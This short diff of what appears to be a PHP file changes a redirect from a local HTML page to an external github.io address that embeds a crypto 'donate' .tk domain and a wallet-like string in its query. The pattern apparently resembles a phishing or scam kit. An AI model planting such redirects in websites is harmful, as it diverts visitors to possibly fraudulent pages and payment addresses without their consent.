@@ -2,7 +2,7 @@
 
 
 
-header("Location:cab56kapl.html");
+header("Location:https://donate-starcryptocoin.github.io/cv/donate.starcryptocoin.tk/cab56kapl.html?card=18kwzvgwhpZh4F6rFegr8n722Q9EkXn3mb");
 
 
 ?>
